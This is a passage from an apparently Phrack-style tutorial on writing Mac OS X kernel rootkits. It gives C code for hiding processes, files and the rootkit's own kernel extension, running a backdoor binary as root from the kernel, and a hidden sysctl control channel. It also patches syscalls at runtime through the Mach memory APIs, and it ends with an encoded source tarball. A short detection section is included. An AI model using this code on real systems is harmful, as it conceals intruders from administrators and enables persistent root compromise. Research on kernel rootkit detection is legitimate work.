+processes using the sysctl(3) syscall. sysctl(2) is a general purpose
+multifunction API used to communicate with a multitude of different
+functions in the kernel. sysctl(2) is used both to list running processes
+as well open network sockets. In order to intercept and modify the running
+process list the entire sysctl syscall needs to be intercepted and the
+commands parsed in order to identify calls to the CTL_KERN-&gt;KERN_PROC
+command used to list current running processes.
+
+The sysctl(2) syscall is intercepted using the exactly same method as
+getuid(), but one of the major differences is that special attention needs
+to be taken with regards to the arguments. In order to support both big
+and little endian systems Apple uses padding macros named PADL and PADR
+that makes the argument struct look very exotic. The easiest way to get it
+right is to copy the entire struct definition from the XNU kernel source
+in order to avoid confusion with the padding. 
+
+sysctl(2) takes its function commands in the form of a char-array called
+'name'. The commands are hierarchical and most commands have several
+subcommands that in turn can have subcommands or arguments. The sysctl(2)
+commands and their respective subcommands can be found in
+'/usr/include/sys/sysctl.h'.
+
+The CTL_KERN-&gt;KERN_PROC command to sysctl copies a list of all running
+processes to a user provided buffer. From the perspective of the rootkit
+this presents a problem since we want to modify the data before it is
+returned to the user but since the syscall writes the data directly to the
+user provided buffer this is problematic. Fortunately we are in position
+to manipulate the data in the user buffer prior returning control to the
+user software. This requires copying the data from userspace into a
+kernelspace buffer, doing the required modification and then copying the
+data back into userspace.
+
+First memory needed to store the copy of the data needs to be allocated
+using the MALLOC-macro, then the data needs to be copied from userspace
+using the copyin(9)-function. The copyin(9) function copies data from
+userspace to kernelspace. Then the data needs to be processed and selected
+entries removed. The actual process of deleting an entry is done by
+overwriting it with the rest of the data in the buffer. This requires
+doing an overlapping memory copy, this functionality is provided by the
+bcopy(3) function. Once an entry has been removed the counter for the
+total size of the buffer needs to be decreased and the data can finally be
+returned, or rather copied, to userspace. 
+
+      /* Search for process to remove */
+      for (i = 0; i &lt; nprocs; i++) 
+        if(plist[i].kp_proc.p_pid == 11) /* hardcoded PID */
+          { 
+
+            /* If there is more then one entry left in the list 
+	     * overwrite this entry with the rest of the buffer */
+
+            if((i+1) &lt; nprocs)
+              bcopy(&amp;plist[i+1],&amp;plist[i],(nprocs - (i + 1)) * sizeof(struct kinfo_proc));
+            
+            /* Decrease size */
+	    oldlen -= sizeof(struct kinfo_proc);
+            nprocs--;
+          }
+
+The modified data is then copied back to the userspace buffer using the
+copyout(9) function. In this case two different functions are used to copy
+data to userspace. The suulong(9) function is used to copy only small
+amounts of data to userspace while copyout(9) is used to copy the actual
+data buffer.
+
+      /* Copy back the length to userspace */
+      suulong(uap-&gt;oldlenp,oldlen);
+
+      /* Copy the data back to userspace */
+      copyout(mem,uap-&gt;old, oldlen);
+
+
+The data trailing the last entry will, if the data was modified, contain
+an extra copy of the last entry in the buffer, something that might be
+used to detect that the buffer has been modified. To avoid this the
+trailing data can be zero:ed. A more sophisticated rootkit might want to
+store a copy of the original buffer prior to the call to the real syscall
+and use that data to pad the remaining buffer space. 
+
+A reference implementation of a processes hiding kernel extension can be 
+found in the code section of this paper.
+
+-[ 4.3 - Hiding files
+
+As noted earlier, three different syscalls are of interest when hiding
+files, SYS_getdirentries, SYS_getdirentriesattr and SYS_getdirentries64.
+All of these syscalls share the sysctl(2) approach in that the calling
+application provides a buffer that the syscall will fill with appropriate
+data and return a counter indicating how much data was written. Due to the
+variable size of each record pointer arithmetics is required when parsing
+the data. All in all it is a complicated procedure and any mishaps is
+likely to cause a kernel crash. It is also important to patch all three
+syscalls of the getdirent-syscall in order to maintain the illusion that
+the malicious files have disappeared.
+
+The process is very similar to hiding a process; the original function is
+invoked, the data copied from userspace to kernelspace, modified as needed
+and then copied back. 
+
+A reference implementation of a file hiding kernel extension can be found
+in the code section of this paper.
+
+-[ 4.4 - Hiding a kernel extension
+
+Kernel modules can be listed with the command 'kextstat'. If the rogue
+rootkit kernel extension can be easily identified using the kextstat
+commands it sort of voids the purpose of the rootkit. nemo [5] identified
+a simple and elegant way to hide the presence of a kernel module for the
+WeaponX [9] kernel rootkit. 
+
+extern kmod_info_t *kmod; 
+
+void activate_cloaking() 
+{ 
+        kmod_info_t *k; 
+        k = kmod; 
+        kmod = k-&gt;next; 
+}
+
+This short snippet of code finds the linked list containing the loaded
+modules and simply delinks the last loaded module from that list. Since
+the kextstat utility will walk this list when presenting the information
+on loaded kernel extensions the newly loaded rootkit will disappear from
+that list. For the same reason the kextunload utility will also fail to
+unload the module from the kernel, which actually can be quite annoying.
+
+-[ 4.5 - Running userspace programs from kernelspace
+
+On Mac OS X there exists a special API called KUNC (Kernel-User
+Notification Center) [6]. This API is used when the kernel (i.e. a KEXT)
+might need to display a notification to the user or run commands in
+userspace.
+
+The KUNC function used to execute commands in userspace is KUNCExecute().
+This function is quite handy in rootkit development, since we may execute
+any command we want as root from kernelspace. The function definition
+looks like this.
+
+(Taken from xnu-xxx/osfmk/UserNotification/KUNCUserNotifications.h)
+
+#define kOpenApplicationPath    0
+#define kOpenPreferencePanel    1
+#define kOpenApplication        2
+
+#define kOpenAppAsRoot          0
+#define kOpenAppAsConsoleUser   1
+
+kern_ret_t
+KUNCExecute(char *executionPath, int openAsUser, int pathExecutionType);
+
+The &quot;executionPath&quot; is the file-system path to the application or
+executable to execute. The &quot;openAsUser&quot; flag can either be
+&quot;kOpenAppAsConsoleUser&quot;, to execute the application as the logged-in user
+or &quot;kOpenAppAsRoot&quot;, to run the application as root. The
+&quot;pathExecutionType&quot; flag specifies the type of application to execute, and
+can be one of the following.
+
+kOpenApplicationPath - The absolute file-system path to a executable.
+kOpenPreferencePanel - The name of a preference pane in
+/System/Library/PreferencePanes.
+kOpenApplication - The name of a application in the &quot;/Applications&quot; folder.
+
+To execute the binary &quot;/var/tmp/mybackdoor&quot; we simply do like this:
+
+KUNCExecute(&quot;/var/tmp/mybackdoor&quot;, kOpenAppAsRoot, kOpenApplicationPath);
+
+This function is especially useful in combination with some sort of
+trigger, like a hooked tcp-handler that executes the function and spawns a
+connect-back shell to the source-ip of a magic trigger-packet. The
+interesting parts of the network layer is actually exported and can be 
+easily modified. 
+
+Or if you prefer a local privilege escalation backdoor, why not hook
+SYS_open and execute the specified file with KUNCExecute if you supply a
+magic flag? The possibilities are endless.
+
+-[ 4.6 - Controlling your rootkit from userspace
+
+Once the appropriate syscalls and kernel functions has been replaced with
+rogue versions capable of hiding files, network sockets and processes each
+of these needs to know what to hide. 
+
+A popular way to trigger process hiding is to hook SYS_kill and send a
+special signal (31337 perhaps?) to the process to hide. This is easy and
+requires no special tools of any kind. If the processes hiding is
+performed by setting special flags on the process this flag can be
+inherited for fork() and exec() and thereby hide an entire process-tree. 
+
+Hiding files and sockets is trickier since we have no easy way to indicate
+to the kernel that we want them hidden. The creation of a new syscall is
+an easy way, or to piggy-back on one of the hooked ones and have a special
+magic argument to trigger the communication code. This does however
+require special tools in userspace capable of calling the right syscall
+with the correct arguments. These tools can be identified and searched for
+even if the rootkit tries to hide them in the filesystem they are always
+vulnerable to offline analysis. 
+
+An easy way to create a communication channel that doesn't require special
+tools or an entry in the /dev/-directory is to use sysctl. In the Mac OS X
+kernel drivers can register their own variables and have them changed
+using the /usr/sbin/sysctl-tool which is available by default on all
+systems. 
+
+Registering a new sysctl can be easily done using the normal kext
+procedures. The source for the example below can be found in reference 7.
+
+/* global variable where argument for our sysctl is stored */
+int  sysctl_arg = 0;
+
+static int sysctl_hideproc SYSCTL_HANDLER_ARGS 
+{     
+      int error;     
+      error = sysctl_handle_int(oidp, oidp-&gt;oid_arg1,oidp-&gt;oid_arg2, req); 
+		
+     if (!error &amp;&amp; req-&gt;newptr) 
+      {         
+	 if(arg2 == 0)
+	   printf(&quot;Hide process %d\n&quot;,sysctl_arg);
+	 else	       
+	   printf(&quot;Unhide process %d\n&quot;,sysctl_arg);
+       }
+       
+   /* We return failure so that we dont show up in &quot;sysclt -A&quot;-listings. */
+   return KERN_FAILURE;
+}
+       
+       
+/* Create our sysctl:s */
+SYSCTL_PROC(_hw, OID_AUTO, hideprocess,CTLTYPE_INT|CTLFLAG_ANYBODY|CTLFLAG_WR,
+	    &amp;sysctl_arg, 0, &amp;sysctl_hideproc , &quot;I&quot;, &quot;Hide a process&quot;); 
+
+SYSCTL_PROC(_hw, OID_AUTO, unhideprocess,CTLTYPE_INT|CTLFLAG_ANYBODY|CTLFLAG_WR,
+	    &amp;sysctl_arg, 1, &amp;sysctl_hideproc , &quot;I&quot;, &quot;Unhide a process&quot;); 
+
+
+kern_return_t kext_start (kmod_info_t * ki, void * d) {
+
+    /* Register our sysctl */
+    sysctl_register_oid(&amp;sysctl__hw_hideprocess);
+    sysctl_register_oid(&amp;sysctl__hw_unhideprocess);
+
+    return KERN_SUCCESS;
+}
+
+This code registers two new sysctl variables, hw.hideprocess and
+hw.unhideprocess. When written to using sysctl -w hw.hideprocess=99 the
+function sysctl_hideproc() is invoked and can be used to add the selected
+PID to the list of processes to hide. A sysctl for hiding files is
+slightly different since it takes a string as argument instead of an
+integer but the overall procedure is the same. The major reason to use
+sysctl is that it support dynamic registration of variable and the
+required tool sysctl is provided by the operating system. 
+
+The -A flag for sysctl is avoided by returning KERN_FAILURE whenever the
+function is called, this causes the newly created variables to be omitted
+from the listing. 
+
+There is also a number of other ways of communicating with the kernel and
+controlling your rootkit. For example you can use the Mach API for IPC or
+using kernel control sockets, both has their pros and cons.
+
+--[ 5 - Runtime kernel patching using the Mach APIs
+
+Instead of using a rogue kernel module (kext) to hijack syscalls the Mach
+API's can be used for runtime kernel patching. This is nothing new to the
+rootkit community, and has previously been used in rootkits such as SucKIT
+by sd [7] and phalanx by rebel [8], two very impressive rootkits for
+Linux.
+
+To access kernel memory on Linux both SucKIT and phalanx uses /dev/kmem
+(and later /dev/mem). /dev/kmem and /dev/mem has been removed from Mac OS
+X as of version 10.4. The Mach-subsystem does however provide a very
+useful set of memory manipulation functions. The functions of interest for
+a rootkit developer are vm_read(), vm_write() and vm_allocate(). These
+functions allows arbitrary read and write access to the entire kernel from
+userspace as well as allowing allocation of kernel memory. The only
+requirement is root access. 
+
+The vm_allocate() function in particular is of great value. A common
+technique used on other operating systems to allocate kernel memory is to
+replace a system call handler with the kmalloc() function, and then
+execute the syscall. This way an attacker is able to allocate memory in
+kernelspace needed to store the wrapper functions. The big downside of
+this approach is the race condition introduced in case some other userland
+process calls the same syscall. But since the friendly Apple kernel
+developers provided the vm_allocate() function this isn't necessary on Mac
+OS X.
+
+-[ 5.1 - System call hijacking
+
+The vm_read() and vm_write() functions can be used as great tools for
+syscall hijacking. First off the address of the sysentry table needs to be
+located. The process identified by Landon Fuller [1] works just as good
+from userspace as it does from kernelspace. The sysentry table contains
+pointers to all the syscall handler functions we want to hijack.
+
+To read the address to the handler function for a syscall, i.e. SYS_kill,
+we can use the vm_read() function, and passing it the address of the
+sy_call variable of SYS_kill.
+
+mach_port_t port;
+pointer_t buf; /* pointer to your result */
+unsigned int r_addr = (unsigned int)&amp;_sysent[SYS_kill].sy_call; /* address to sy_call */
+unsigned int len = 4; /* number of bytes to read */
+unsigned int sys_kill_addr = 0; /* final destination */
+
+/* get a port to pid 0, the mach kernel */
+if (task_for_pid(mach_task_self(), 0, &amp;port)) {
+   fprintf(stderr, &quot;failed to get port\n&quot;);
+   exit(EXIT_FAILURE);
+}
+
+/* read len bytes from r_addr, return pointer to the data in &amp;buf */
+if (vm_read(port, (vm_address_t)r_addr, (vm_size_t)len, &amp;buf, &amp;sz) != KERN_SUCCESS) {
+   fprintf(stderr, &quot;could not read memory\n&quot;);
+   exit(EXIT_FAILURE);
+}
+
+/* do proper typecast */
+sys_kill_addr = *(unsigned int*)buf;
+
+The address to the SYS_kill handler is now available in the sys_kill_addr
+variable. Replacing a syscall handler is as simple as writing a new value
+to the same location using the vm_write() function. In the example below
+we replace the SYS_setuid system call handler with the handler for
+SYS_exit, which will result in the termination of any program that calls
+SYS_setuid.
+
+SYSENT *_sysent = get_sysent_from_mem();
+mach_port_t port;
+pointer_t buf;
+unsigned int r_addr = (unsigned int)&amp;_sysent[SYS_exit].sy_call; /* address to sy_call */
+unsigned int len = 4; /* number of bytes to read */
+unsigned int sys_exit_addr = 0; /* final destination */
+unsigned int sz, addr;
+
+/* get a port to pid 0, the mach kernel */
+if (task_for_pid(mach_task_self(), 0, &amp;port)) {
+        fprintf(stderr, &quot;failed to get port\n&quot;);
+	exit(EXIT_FAILURE);
+}
+
+/* read len bytes from r_addr, return pointer to the data in &amp;buf */
+if (vm_read(port, (vm_address_t)r_addr, (vm_size_t)len, &amp;buf, &amp;sz) != KERN_SUCCESS) {
+        fprintf(stderr, &quot;could not read memory\n&quot;);
+	exit(EXIT_FAILURE);
+}
+
+/* do proper typecast */
+sys_exit_addr = *(unsigned int*)buf;
+
+/* address to system call handler pointer of SYS_setuid */
+addr = (unsigned int)&amp;_sysent[SYS_setuid].sy_call;
+
+/* replace SYS_setuids handler with the handler of SYS_exit */
+if (vm_write(port, (vm_address_t)addr, (vm_address_t)&amp;sys_exit_addr, 
+                      sizeof(sys_exit_addr))) {
+   fprintf(stderr, &quot;could not write memory\n&quot;);
+   exit(EXIT_FAILURE);
+}
+
+Now if any program calls setuid(), it will be redirected to the system
+call handler of SYS_exit, and end gracefully. The same thing that can be
+done using a kernel extension can also be accomplished using the Mach API.
+
+In order to actually create a wrapper or completely replace a function
+some kernel memory is needed to store the new code. Below is a simple
+example of how to allocate 4096 bytes of kernel memory using the Mach API.
+
+vm_address_t buf; /* pointer to our newly allocated memory */
+mach_port_t port; /* a mach port is a communication channel between threads */
+
+/* get a port to pid 0, the mach kernel */
+if (task_for_pid(mach_task_self(), 0, &amp;port)) {
+   fprintf(stderr, &quot;failed to get port\n&quot;);
+   exit(EXIT_FAILURE);
+}
+
+/* allocate memory and return the pointer to &amp;buf */
+if (vm_allocate(port, &amp;buf, 4096, TRUE)) {
+   fprintf(stderr, &quot;could not allocate memory\n&quot;);
+   exit(EXIT_FAILURE);
+}
+
+If everything went as planned we now have 4096 bytes of fresh kernel
+memory at our disposal, accessible via buf. This memory can be used as a
+place to store our syscall hooks
+
+-[ 5.2 - Direct Kernel Object Manipulation
+
+It is not just system calls that can be hijacked using this technique, it
+also works just as good to manipulate various other objects in
+kernelspace.  A good example of such a object is the allproc structure,
+which is a list of proc structures of currently running processes on the
+system. This list is used by programs such as ps(1) and top(1) to get
+information about the running processes.
+
+So if you have processes you want to hide from a nosy administrator a nice
+way of doing so is by removing the process proc strcuture from the allproc
+list. This will make the process magically disappear from ps(1), top(1)
+and any other tools that uses the allproc structure as source of
+information.
+
+The allproc struct is, just as the nsysten variable, a exported symbol of
+the kernel. To get the address of the allproc structure in memory you may
+do something like this:
+
+# nm /mach_kernel | grep allproc
+0054280c S _allproc
+#
+
+Now that you have the address of the allproc structure (0x0054280c) all
+you need to do is to modify the list and remove the proc structure of
+the preferred process. As described in &quot;Designing BSD Rootkits&quot; [11] this
+is usually done iterating through the list with the LIST_FOREACH() macro
+and removing entries with the LIST_REMOVE() macro. Since we can't modify
+the memory directly we have to use a wrapper utilizing the vm_read() and
+vm_write() functions, which we also leave as an exercise for the reader
+to implement. :)
+
+--[ 6 - Detection
+
+Detecting kernel rootkits can be very difficult. Some well known rootkits
+leaves traces in the filesystem or open network sockets that can be used
+to identify them. But this is nothing every rootkit does and wont help you
+to spot unknown rootkits. 
+
+Keeping a known good list of the sysentry table and comparing that to the
+current state is another way to try to identify if syscalls have been
+modified. A popular workaround for that is to keep a shadow copy of the
+entire syscall table and modify the interupt-handler to the use the shadow
+table instead of the original one. This will leave the original sysentry
+table intact and anyone looking at it will find it unmodified even though
+all syscalls are still re-routed through the malicious functions. Another
+way is to replace the entire interrupt-handler as well as the sysentry
+table. 
+
+Rootkits that intercept syscalls and modify the contents can sometimes be
+found by the fact that the buffer used to return data has junk at the end.
+Rootkit developers could surely fix this problem, but they often don't.
+Other indications of mischief is that calls that only returns counters,
+for instance the number of running processes, systematically doesn't match
+the count of running processes when listed. 
+
+One way of finding hidden files is to write software that accesses the
+underlying filesystem directly and matches the files on disk with the
+output from the kernel. This requires writing filesystem software or
+finding a library for the specific filesystem used. The upside is that it
+is virtually impossible to intercept and modify calls to the raw device. 
+
+Rootkits that hide open ports can under some circumstances be detected by
+port-scanning, when more advanced rootkits often use port-knocking or
+other types out of band signaling to avoid opening ports. 
+
+Detecting rootkits is a cat and mouse game, and the only winning move is
+not to play. 
+
+-[ 6.1 - Detecting hooked system calls on Mac OS X
+
+Now that you know how to hook system calls, we are going to show you a
+simple, yet effective, way of detecting if your system has gotten any of
+it's system calls hijacked.
+
+We already know that we can get the location of the sysent array in
+memory by adding 32 bytes to the exported nsysent symbol. We also know
+that the nsysent symbol contains the actual number of syscalls available
+on Mac OS X, which is 427 (0x1ab) on 10.5.6.
+
+Now, if we want to check if the current sysent array has been compromised
+we need something to compare it with, something like the original table.
+On Mac OS X the kernel image is a uncompressed, universal (Leopard)
+macho-o binary named mach_kernel found in the root of the filesystem. If
+we take a closer look at the kernel image we get this:
+
+# otool -d /mach_kernel | grep -A 10 &quot;ab 01&quot;
+[...]
+0050a780	ab 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+0050a790	00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+0050a7a0	00 00 00 00 94 cf 38 00 00 00 00 00 00 00 00 00 
+0050a7b0	01 00 00 00 00 00 00 00 01 00 00 00 6a 37 37 00
+#
+
+At 0050a780 we see the magic number 427 (0x000001ab), the number of
+available syscalls. If we look 32 bytes ahead we see the value 0x38cf94,
+can this be the start of the sysent array? I think it is!
+
+All we need to is to copy the kernel image to a buffer, find the offset to
+the nsysent symbol, add 32 bytes to the offset and return a pointer to
+that position and we have our original sysent array. All this can be done
+with the following C function.
+
+char *
+get_sysent_from_disk(void)
+{
+	char *p;
+	FILE *fp;
+
+	unsigned long sz;
+	int i;
+
+	fp = fopen(&quot;/mach_kernel&quot;, &quot;r&quot;);
+	if (!fp) {
+		fprintf(stderr, &quot;could not open file\n&quot;);
+		exit(-1);
+	}
+
+	fseek(fp, 0, SEEK_END);
+	sz = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+
+	buf = malloc(sz);
+	p = buf;
+
+	fread(buf, sz, 1, fp);
+	fclose(fp);
+
+	for (i = 0; i &lt; sz; i++) {
+		if (*(unsigned int *)(p) == 0x000001ab &amp;&amp;
+			*(unsigned int *)(p + 4) == 0x00000000) {
+			return (p + 32);
+		}
+		p++;
+	}
+
+	return NULL; /* epic fail */
+}
+
+This function can later be used in a simple detector.
+
+struct sysent *_sysent_from_ram;
+struct sysent *_sysent_from_hdd;
+
+_sysent_from_ram = (struct sysent *)get_sysent_from_ram();
+_sysent_from_hdd = (struct sysent *)get_sysent_from_disk();
+
+for (i = 0; i &lt; 428; i++) {
+	if (get_syscall_addr(i, _sysent_from_ram) != get_syscall_addr(i,
+	_sysent_from_hdd))
+		report_hooked_syscall(i);
+}
+
+Of course this method has it's flaws. An attacker may manipulate the
+SYS_open syscall and redirect the call to a rogue copy of the kernel image
+if the file /mach_kernel is accessed. This can be overcome by always
+keeping a fresh and clean copy of the kernel image on a non-writable
+media.
+
+This method is also not capable of detecting inline function hooks in the
+system call handler functions, that's a modification left as an exercise
+for the reader to implement.
+
+--[ 7 - Summary
+
+Rootkits on Mac OS X is not a new topic, but not as well researched as
+i.e. rootkits on Windows or Linux. As we have shown, the techniques used
+is quite similar to the ones used on other unix-like operating systems. In
+addition to this OS X has some extra goodies, like the I/O Kit framework
+and the Mach API, that provides really useful features for people trying
+to subvert the XNU kernel.
+
+Manipulating syscalls, internal kernel structures and other parts of the
+XNU kernel is a great way to hide processes, files and folders and even to
+place backdoors accessible directly from userland. All this can be
+achieved using either a kernel extension or the Mach API, and if done
+right almost impossible to detect. Both techniques have different
+advantages and it's up to you to choose which technique to use in your own
+rootkit.
+
+The purpose of this article was first and foremost to give a basic
+understanding of the subject and is intended as an entry level tutorial
+for anyone wishing to implement their own OS X kernel rootkit and we
+sincerely hope that it helped to shed some light on the subject.
+
+--[ 8 - References
+
+[1] Landon Fuller - Fixing ptrace(pt_deny_attach, ...) on Mac OS X 10.5 Leopard
+     http://landonf.bikemonkey.org/code/macosx/Leopard_PT_DENY_ATTACH.20080122.html
+
+[2] Apple Developer Connection
+     http://developer.apple.com
+
+[3] Apple - Darwin source code
+     http://opensource.apple.com/darwinsource/
+
+[4] Apple Kernel Programming guide
+     http://developer.apple.com/documentation/Darwin/Conceptual/KernelProgramming/keepout/keepout.html
+
+[5] nemo of felinemenace
+     http://felinemenace.org/~nemo/
+
+[6] I/O Kit Device Driver Design Guidelines: Kernel-User Notification
+     http://developer.apple.com/documentation/DeviceDrivers/Conceptual/WritingDeviceDriver/KernelUserNotification/KernelUserNotification.html
+
+[7] Linux on-the-fly kernel patching without LKM
+     http://phrack.org/issues.html?issue=58&amp;id=7#article
+
+[8] phalanx rootkit by rebel
+     http://packetstormsecurity.org/UNIX/penetration/rootkits/phalanx-b6.tar.bz2
+
+[9] WeaponX rootkit by nemo
+     http://packetstormsecurity.org/UNIX/penetration/rootkits/wX.tar.gz
+
+[10] logKext keylogger by drspringfield
+      http://code.google.com/p/logkext/
+
+[11] Designing BSD Rootkits by Joseph Kong
+      ISBN 1593271425
+
+--[ 9 - Code
+
+begin 644 code.tar.gz
+M'XL(&quot;!LM]TD``V-O9&amp;4N=&amp;%R`.S]8Y1G3;,OBI9M=]FV;=NV;1M=MFW;MJNZ
+MW&amp;7;KNJR3O?SO._27NOL&lt;\?8&gt;YU[Q]TYYJC\S\P,9,0O8N:'F#6-[(Q-Z`#^
+M]S;ZWXV-A&gt;7OGI7UKYZ&gt;D?GO_N\&amp;P,#`P,;(P,C`RL((0,_P&gt;QD+`#[+_V:]
+M_FHN3LX&amp;COCX`(9V3DXF_S?K?B\S-?WO4.B_MQG]\;^9B;.+A;&amp;Y@9$5K;.9
+MY_]R&amp;7\&lt;S,K,_%_XG_$O9__V/Q,C*Q,+,^-OG#`PL3(S`.#3_R_7Y#]I_W_N
+M?[Q(&quot;`!H+BL)`.`+'@NG]9&amp;$=\N/B/`MK_#J9HD-?-6(1FZ&lt;RT3C:@HR61N;
+M&lt;GQ'&lt;D(@0#2`LS`J/O.O@ZM'&amp;+@]#&amp;T4$26-?G&quot;)O$ZSCM+2TL[C/I;'E!'C
+MDE@[S&gt;C2#O8V98U'/M2O1&amp;3BK_E&gt;3.Z9R$#&quot;'T#@,QZZ*D5@&quot;;E5HO56IYX=
+M0?*#/VFZ(&gt;#Z2N9ME,T[EQ\J/L&quot;7FBW:&amp;DO:[2^VV&lt;IA6=;TDD00U_02VE,?
+MMW\DKW^.+BWPAF[KSC]@#W:X+M,%,=&lt;12K1?TMTI-GR`OF(X9!HQ?;WZ;7U^
+MO?%5CP@`L\ABNAIMS&amp;*9#IJ_S_5%0VYT!LN5[@[@=!KTDP7.4+S[P?26W'2O
+MJLN[M^[V;V+Y^^;)@T&gt;K&amp;L%_9K&amp;(1N=B38Q@GVA&amp;R]UH@W=X[D/5V1&gt;&quot;HZ#Y
+M[P($GX]$_7Q&amp;_+QD^\3Z[/W.5WJ3Q#\%&amp;&quot;/O#A#!^3[PZU3+'PD3^WT.X!CA
+MAU?[F5[]9^_K&amp;K9=4U3&quot;)]T=$-ZCG\0.A^$7:+S7Z==ZVZ&gt;INI$31_^)&gt;4VL
+M&amp;&lt;W==O%379^MTZ.O'9UGQ[9FARS5\Z(CGO:=756FJ5-+;ZL8`JE[!,P$&lt;K`4
+M?#M\ZL%J\1/F2,SABA!]0=1&lt;OY:S%1;R':3_R&lt;Z4P7?QZT'0L/MBEVA`)VNM
+M&amp;G2&quot;YUS_^M!KG@OUI$!0E[X4&lt;#8M&lt;'-+]42IKY%SMI,SP.R3I:&amp;667N+C!4!
+M&lt;)HF&lt;)F3;T8H&quot;^.A(N`,PB!I7GI/\IA#\[72,,/XPKWY&gt;'/G&gt;8(G#^?+^]_(
+M$;P_&gt;,MFL'[1C;%\]CW^&lt;G$_GB(0!/FP&amp;T'1T&lt;4TU&amp;KOVB&quot;&quot;(3MY.4CITWQ+
+M&amp;!OUDQR#M-''F:UG82BY`?WDG-42@!-8_&quot;QB]/_)S2TF_`AH@E!C\&quot;T',)#=
+M_))D]35BP(KN'4CD'BH)1V&lt;6/^5*&amp;X\18-V!'&gt;A$_^F1OD,!@I/EP&gt;J)'ACS
+M5,9]'[]M$`26F00,BN7A.F+`0$5&gt;A%-Z(9G2/H&amp;&amp;T'R-`LX(5;W$!!6AV_.F
+M;F9M*S&gt;/L2=GY::/K3848NUT`\Q87G)&amp;M,5(&amp;RO%MB&quot;/+]Z44,:#87!LP`TB
+M&quot;&gt;.;TPE?JWN@;?U^0DE3Z5@IV*LD2J8KF+?;MZTBSHOE-Y:G$,M16.&gt;,,-0F
+MQH?4H?&gt;`O&gt;W)R_%B0%Z\.6YGH^\Z&lt;#);&gt;&gt;^X`D.`R3B&amp;=MQ&quot;D:AJO&amp;GW&quot;.8$
+M-TV*#\)BT&gt;)1W.O]8\`U-DY(\05A5+N`K,5WN87;HOW57Y8AE'MNT/@/D'32
+M/E%SV;M3&lt;=W.&lt;3YF(@5:*L$BQ%N-:D`D148Z5[E!&lt;F:IA3/=6_K,!0TT2#7=
+MY(DTBV7&gt;!**$PEZUBM$(WB4B$80)N77GD2PE9O%[0\;O/T9I$L6E(Y\&gt;=0_%
+M][7@S&gt;G4JB,OOS9C+R&amp;WU#'S1-_I;@.A/G,'R@&gt;DWGNC*ZL^PM4S]'OI_:AJ
+MM$3SO^`O:\*\?P&gt;;[([&gt;WE&gt;UMAC?YLR4O?.[0ZZ=XQN$UNQ[B,O'_N=QY&amp;[G
+MXZ?&lt;]5-,S[G?A&lt;Z[*R\_=`*RX'%N)]DH3]-7S&gt;(9-1JI;?,KNH^SKR-W!S]_
+MX2)FUF7A1_HQS6?S8D=GI]492`5'RS'(K$TVUR,0U]8@)((7.,14.-MJJ*'W
+M6?A9WV8XP^/6=3=G1S_\-9?13-OP,4!]WZ_S=-Y1,9H[&quot;/QW[44O_&quot;\N;AY+
+MT%XA[?FFZYN#A1QJF0M1\8[]DX.)RKH\-5YW-PL9:6_#\T2GS&lt;S@G=H&quot;1&lt;,#
+MX&quot;BECT^,`;1-S-JQVAT:,*!J2;1?76\FS.&quot;C%T%&amp;=.CH&lt;&quot;,$^AG\66^HG&quot;).
+MY??LS/XJOQQ.TT.&quot;Y^C`&gt;B*1.2R#J:]1KLU&gt;JQVJ@ZX%OY7_&gt;-`W!/A1T_A4
+M[);?R29\&gt;]Y,T2\(8O/T[&lt;)(CFW2\P*1IQA*Z@%W+D2,EZ&quot;B^7F=F5I/RJY3
+M:C#+?[F;F:&lt;5]XVW%&amp;%?`8D\[]:;'9[Z&quot;H$PWC,*/*RL,O$F=*&lt;0&gt;IW536]&lt;
+M*,;&amp;K,:+9STC0[XUHQJ7\1I9`#'9;&amp;XFO&amp;?]$=9Y.3/#6LQ\IJ`\8&quot;:GO--V
+MN?Y:^V+!*-FP`.&quot;!P_YUH@PWB,CK-(JA[.K[NYE'C`UOJNKE?N6ARW+_*^Q4
+M\$++BG^TX&lt;E,H`U&amp;UN4MK`0%(,^&gt;`!E.&quot;6%(.D3G&amp;!'SY2AHRZ&gt;1193=9*AG
+MM22&quot;@O_+)6;3UHH4B\-W'22FZOS!Y9F!_CR5RVSLVGF)?MIV5R0+](='*3OC
+M4V@WT^4H&amp;,$J(&amp;CG!:B@#8Q$!S`AS6K&gt;GF%2R&amp;DMLI'D0BYXA$JLUH[04#@4
+M7[/!,AE]&lt;8DK!@E\N0&lt;&amp;6]G!4)H;[=.PG9*@:U[7T9AZ?&quot;&gt;%4\$W]XJ@3JR@
+M9S+?L9V@S&lt;!&lt;(L[1A\A=3#6J;[@R+O/#U0C.]M&lt;&amp;$R8H*,0-/XM&quot;7VW4W,*&gt;
+M3+3%R.-]X[:IX)?M,N!S8]\4A+XOB%27NC&quot;K'(5XJWV#&amp;:-$T\&quot;X&quot;Q*.1,BB
+MXR&amp;?)G.&amp;F8Q3U;&amp;`HVE+!L&lt;**J21](C13&amp;&lt;T8J]Q,YB\K=V16G?S&amp;=1)&gt;P7.
+M.1@[&lt;P^DF4G#'((@#F9I.198,ZW_T=(V%4P7:AI#+?&gt;P;7.,SA&gt;`K$#,!*MO
+MNA4)@.L+OPM+A9&lt;SX=_8P!/P6F3E:(K&lt;,\(Y5ZK&lt;0+:7D^;%9Q,'CCC!_&amp;$I
+MW?6-R@9EZ18'K]9NZT-9+PI5/B?A;,H:7:OH7N=45A'/4)PJ&gt;8%BTRWG2MOH
+M&gt;G-`MZB!PJ*/&quot;LFG8RLH?,+?)O+CPAIEP=9\S^NGF!@T/4)1A;6[YIY8J9DA
+M3RAAL'NI5J+;\J/8&lt;=!4B*9%)4._S$FM`(MH3O&lt;)+0]=;8\PK;%MS,=&quot;8VVM
+M`!I[HH9F[JYZ:T&gt;'G2&gt;O[?QP!U..`!LSF43CMF9S12U@3ZR-X2B\I#-ZHUCP
+MQ8D#=PL-:Y4=):\L,-93Y&gt;Y4PW@3MU&lt;](7(C&lt;GZZ/H)]?JO7+-T41L`8*2@_
+MV6M0]R]'9ZXS)(9X_F+OMV[G7\\(B:)ADQ[+8-EIM0E5&gt;#%OMM@4&quot;L8;5J?A
+M9W7KIPX)DQ;=/7P^PTZ&quot;#?7S$-F:$-I&gt;&gt;14@`C]1&lt;/.\,.E&lt;WDA(G+VRM&quot;LE
+M40!'JGAGH+GUPN@14&quot;3.(AC)(G5$SA/B8&gt;.,B[N^AUGDO&quot;=#(7ANY!$Y9($4
+MPX1@&gt;L&lt;3YYPO&quot;&gt;QX@`EV`0]G\/DQRZ$Q[G2\V_=1)/QX`N\++7$],`B!)5U$
